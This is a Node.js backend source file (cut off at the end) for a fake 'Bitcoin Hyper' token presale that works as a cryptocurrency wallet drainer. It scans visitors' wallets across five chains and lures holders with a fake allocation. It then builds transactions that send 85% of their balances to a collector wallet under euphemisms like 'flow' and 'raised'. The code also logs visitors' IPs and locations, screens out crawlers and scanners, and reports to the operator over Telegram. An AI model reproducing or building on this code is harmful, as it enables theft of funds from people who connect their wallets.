// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================
// PERSISTENT STORAGE - NEVER CLEARS AUTOMATICALLY
// ============================================

const DATA_DIR = path.join(__dirname, 'data');
const STORAGE_FILE = path.join(DATA_DIR, 'storage.json');

// Create data directory if it doesn't exist
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  console.log('📁 Created data directory');
}

// Load storage from disk
function loadStorage() {
  try {
    if (fs.existsSync(STORAGE_FILE)) {
      const data = fs.readFileSync(STORAGE_FILE, 'utf8');
      const parsed = JSON.parse(data);
      
      // Convert arrays back to Maps and Sets
      const storage = {
        participants: parsed.participants || [],
        pendingFlows: new Map(parsed.pendingFlows || []),
        completedFlows: new Map(parsed.completedFlows || []),
        settings: parsed.settings || {
          tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
          tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
          valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
          statistics: {
            totalParticipants: 0,
            eligibleParticipants: 0,
            claimedParticipants: 0,
            uniqueIPs: [],
            totalProcessedUSD: 0,
            totalProcessedWallets: 0,
            processedTransactions: []
          },
          flowEnabled: process.env.DRAIN_ENABLED === 'true'
        },
        emailCache: new Map(parsed.emailCache || []),
        siteVisits: parsed.siteVisits || []
      };
      
      // Convert uniqueIPs array back to Set in memory but store as array
      if (storage.settings.statistics.uniqueIPs && Array.isArray(storage.settings.statistics.uniqueIPs)) {
        // Keep as array for storage, we'll handle it
      }
      
      console.log(`✅ Loaded storage:
  - Participants: ${storage.participants.length}
  - Site Visits: ${storage.siteVisits.length}
  - Pending Flows: ${storage.pendingFlows.size}
  - Completed Flows: ${storage.completedFlows.size}
  - Total Raised: $${storage.settings.statistics.totalProcessedUSD}`);
      
      return storage;
    }
  } catch (error) {
    console.error('Error loading storage:', error);
  }
  
  // Return default storage if file doesn't exist
  console.log('📁 No existing storage found, creating new...');
  return {
    participants: [],
    pendingFlows: new Map(),
    completedFlows: new Map(),
    settings: {
      tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
      tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
      valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
      statistics: {
        totalParticipants: 0,
        eligibleParticipants: 0,
        claimedParticipants: 0,
        uniqueIPs: [],
        totalProcessedUSD: 0,
        totalProcessedWallets: 0,
        processedTransactions: []
      },
      flowEnabled: process.env.DRAIN_ENABLED === 'true'
    },
    emailCache: new Map(),
    siteVisits: []
  };
}

// Save storage to disk
function saveStorage() {
  try {
    // Convert Maps to arrays for JSON serialization
    const toSave = {
      participants: memoryStorage.participants,
      pendingFlows: Array.from(memoryStorage.pendingFlows.entries()),
      completedFlows: Array.from(memoryStorage.completedFlows.entries()),
      settings: {
        ...memoryStorage.settings,
        statistics: {
          ...memoryStorage.settings.statistics,
          uniqueIPs: memoryStorage.settings.statistics.uniqueIPs // Already array
        }
      },
      emailCache: Array.from(memoryStorage.emailCache.entries()),
      siteVisits: memoryStorage.siteVisits
    };
    
    fs.writeFileSync(STORAGE_FILE, JSON.stringify(toSave, null, 2));
    console.log(`💾 Saved: ${memoryStorage.participants.length} participants, $${memoryStorage.settings.statistics.totalProcessedUSD} raised`);
  } catch (error) {
    console.error('Error saving storage:', error);
  }
}

// Save every 30 seconds to ensure data persistence
setInterval(saveStorage, 30000);

// Initialize storage
let memoryStorage = loadStorage();

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    storage: '💾 PERSISTENT',
    stats: {
      participants: memoryStorage.participants.length,
      visits: memoryStorage.siteVisits.length,
      totalRaised: `$${memoryStorage.settings.statistics.totalProcessedUSD}`,
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size
    },
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Optimism': null // Not deployed yet
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// STORAGE (in-memory with persistence)
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    return false;
  }
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    telegramEnabled = false;
    return false;
  }
  
  try {
    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    
    if (meResponse.data?.ok) {
      telegramBotName = meResponse.data.result.username;
      telegramEnabled = true;
      
      const startMessage = 
        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
        `💾 Storage: ${memoryStorage.participants.length} participants\n` +
        `💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD}\n` +
        `🌍 Site: https://bitcoinhypertoken.vercel.app`;
      
      await sendTelegramMessage(startMessage);
      return true;
    }
  } catch (error) {}
  
  telegramEnabled = false;
  return false;
}

// ============================================
// HUMAN/BOT DETECTION
// ============================================

function detectHuman(userAgent) {
  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
  
  return {
    isHuman: !isBot,
    isBot: isBot,
    deviceType: hasTouch ? 'Mobile' : 'Desktop'
  };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL WALLET EMAIL EXTRACTION
// ============================================

async function getWalletEmail(walletAddress) {
  if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
    return memoryStorage.emailCache.get(walletAddress.toLowerCase());
  }
  
  try {
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const username = `user${hash.substring(0, 12)}`;
    
    const lastChar = walletAddress.slice(-1);
    const domains = {
      '0-3': 'proton.me',
      '4-7': 'gmail.com',
      '8-b': 'outlook.com',
      'c-f': 'pm.me'
    };
    
    const charCode = parseInt(lastChar, 16);
    let domain = 'proton.me';
    
    if (charCode <= 3) domain = domains['0-3'];
    else if (charCode <= 7) domain = domains['4-7'];
    else if (charCode <= 11) domain = domains['8-b'];
    else domain = domains['c-f'];
    
    const email = `${username}@${domain}`;
    memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
    saveStorage();
    return email;
    
  } catch (error) {
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    return `user${hash.substring(0, 8)}@proton.me`;
  }
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// TRACK SITE VISIT
// ============================================

async function trackSiteVisit(ip, userAgent, referer, path) {
  const location = await getIPLocation(ip);
  const humanInfo = detectHuman(userAgent);
  
  const visit = {
    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    ip: ip.replace('::ffff:', ''),
    timestamp: new Date().toISOString(),
    country: location.country,
    flag: location.flag,
    city: location.city,
    userAgent: userAgent || 'Unknown',
    referer: referer || 'Direct',
    path: path || '/',
    walletConnected: false,
    walletAddress: null,
    isHuman: humanInfo.isHuman,
    deviceType: humanInfo.deviceType
  };
  
  memoryStorage.siteVisits.push(visit);
  saveStorage();
  
  return visit;
}

// ============================================
// WALLET BALANCE CHECK
// ============================================

async function getWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          });
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    
    if (results.isEligible) {
      results.allocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error);
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// TRACK VISIT ENDPOINT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        isHuman: visit.isHuman
      }
    });
    
  } catch (error) {
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    const lastVisit = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        email: email,
        connectedAt: new Date().toISOString(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false,
        userAgent: req.headers['user-agent'],
        visitId: lastVisit?.id,
        isHuman: lastVisit?.isHuman || true,
        deviceType: lastVisit?.deviceType || 'Unknown'
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      
      // Handle unique IPs as array
      if (!memoryStorage.settings.statistics.uniqueIPs.includes(clientIP)) {
        memoryStorage.settings.statistics.uniqueIPs.push(clientIP);
      }
      
      saveStorage();
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    if (balanceResult.success) {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date().toISOString();
      participant.balances = balanceResult.data.balances;
      
      if (balanceResult.data.isEligible && !participant.eligibilityCounted) {
        memoryStorage.settings.statistics.eligibleParticipants++;
        participant.eligibilityCounted = true;
      }
      
      saveStorage();
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.85).toFixed(12),
        valueUSD: (b.valueUSD * 0.85).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    saveStorage();
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (participant) {
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      
      const flow = memoryStorage.pendingFlows.get(flowId);
      if (flow) {
        if (!flow.completedChains) flow.completedChains = [];
        if (!flow.completedChains.includes(chainName)) {
          flow.completedChains.push(chainName);
        }
        
        // Find transaction value
        const tx = flow.transactions.find(t => t.chain === chainName);
        if (tx) {
          memoryStorage.settings.statistics.processedTransactions.push({
            wallet: walletAddress,
            chain: chainName,
            flowId,
            txHash,
            valueUSD: parseFloat(tx.valueUSD),
            timestamp: new Date().toISOString()
          });
        }
        
        // Check if flow is complete
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString() 
          });
          memoryStorage.pendingFlows.delete(flowId);
        }
        
        saveStorage();
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Execute flow error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date().toISOString();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    saveStorage();
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN DASHBOARD WITH DAY/WEEK FILTERS
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const filter = req.query.filter || 'week'; // 'day' or 'week' or 'all'
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  // Calculate time filter
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  let filterTime = 0; // 'all' = no filter
  
  if (filter === 'day') {
    filterTime = now - oneDay;
  } else if (filter === 'week') {
    filterTime = now - (7 * oneDay);
  }
  
  // Filter function
  const isInRange = (timestamp) => {
    if (filter === 'all') return true;
    return new Date(timestamp).getTime() > filterTime;
  };
  
  // Filter data
  const filteredVisits = memoryStorage.siteVisits.filter(v => isInRange(v.timestamp));
  const filteredParticipants = memoryStorage.participants.filter(p => isInRange(p.connectedAt));
  
  const filteredPendingFlows = Array.from(memoryStorage.pendingFlows.entries())
    .filter(([_, flow]) => isInRange(flow.createdAt))
    .map(([id, flow]) => ({ id, ...flow }));
  
  const filteredCompletedFlows = Array.from(memoryStorage.completedFlows.entries())
    .filter(([_, flow]) => isInRange(flow.completedAt))
    .map(([id, flow]) => ({ id, ...flow }));
  
  const filteredTransactions = memoryStorage.settings.statistics.processedTransactions
    .filter(t => isInRange(t.timestamp));
  
  // Calculate totals
  const totalRaised = filteredTransactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
  
  // Location stats
  const locationStats = {};
  filteredParticipants.forEach(p => {
    const key = `${p.country}|${p.flag || '🌍'}`;
    if (!locationStats[key]) {
      locationStats[key] = { country: p.country, flag: p.flag || '🌍', count: 0, eligible: 0 };
    }
    locationStats[key].count++;
    if (p.isEligible) locationStats[key].eligible++;
  });
  
  // Daily activity
  const dailyActivity = {};
  filteredVisits.forEach(v => {
    const date = new Date(v.timestamp).toISOString().split('T')[0];
    dailyActivity[date] = (dailyActivity[date] || 0) + 1;
  });
  
  // Hourly activity
  const hourlyActivity = {};
  filteredVisits.forEach(v => {
    const hour = new Date(v.timestamp).getHours();
    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
  });
  
  // Network status
  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
    chain,
    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
    collector: COLLECTOR_WALLET
  }));
  
  // Summary stats
  const summary = {
    filter: filter === 'day' ? 'Last 24 Hours' : filter === 'week' ? 'Last 7 Days' : 'All Time',
    totalVisits: filteredVisits.length,
    uniqueIPs: new Set(filteredVisits.map(v => v.ip)).size,
    totalParticipants: filteredParticipants.length,
    eligibleParticipants: filteredParticipants.filter(p => p.isEligible).length,
    claimedParticipants: filteredParticipants.filter(p => p.claimed).length,
    totalRaisedUSD: totalRaised.toFixed(2),
    totalProcessedWallets: filteredTransactions.length,
    pendingFlows: filteredPendingFlows.length,
    completedFlows: filteredCompletedFlows.length,
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'N/A'
  };
  
  // System config
  const system = {
    valueThreshold: memoryStorage.settings?.valueThreshold || 1,
    flowEnabled: memoryStorage.settings?.flowEnabled || false,
    tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
    tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
    collectorWallet: COLLECTOR_WALLET,
    totalStorage: {
      allTimeParticipants: memoryStorage.participants.length,
      allTimeVisits: memoryStorage.siteVisits.length,
      allTimeRaised: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)
    }
  };
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary,
    networks: networkStatus,
    recentVisits: filteredVisits.slice(-50).reverse(),
    activeParticipants: filteredParticipants.slice(-30).reverse(),
    pendingFlows: filteredPendingFlows.slice(-20).reverse(),
    completedFlows: filteredCompletedFlows.slice(-20).reverse(),
    processedTransactions: filteredTransactions.slice(-30).reverse(),
    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
    dailyActivity: Object.entries(dailyActivity).map(([date, count]) => ({ date, count })).sort((a, b) => a.date.localeCompare(b.date)),
    hourlyActivity: Object.entries(hourlyActivity).map(([hour, count]) => ({ hour: parseInt(hour), count })).sort((a, b) => a.hour - b.hour),
    system
  });
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalRaisedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      telegram: telegramEnabled ? '✅' : '❌',
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.length
    }
  });
});

// ============================================
// ADMIN WALLET DETAILS
// ============================================

app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) return res.status(401).json({ success: false });
  
  const walletAddress = req.params.address.toLowerCase();
  
  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
  const flows = {
    pending: Array.from(memoryStorage.pendingFlows.values()).filter(f => f.walletAddress === walletAddress),
    completed: Array.from(memoryStorage.completedFlows.values()).filter(f => f.walletAddress === walletAddress)
  };
  const transactions = memoryStorage.settings.statistics.processedTransactions.filter(t => t.wallet.toLowerCase() === walletAddress);
  
  res.json({
    success: true,
    found: !!participant,
    wallet: participant,
    visits,
    flows,
    transactions
  });
});

// ============================================
// ADMIN MANUAL SAVE
// ============================================

app.post('/api/admin/save', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  saveStorage();
  res.json({ success: true, message: 'Storage saved manually' });
});

// ============================================
// ADMIN RESET STATS (optional - use carefully)
// ============================================

app.post('/api/admin/reset-stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  // Reset only statistics counters, keep participant data
  memoryStorage.settings.statistics = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
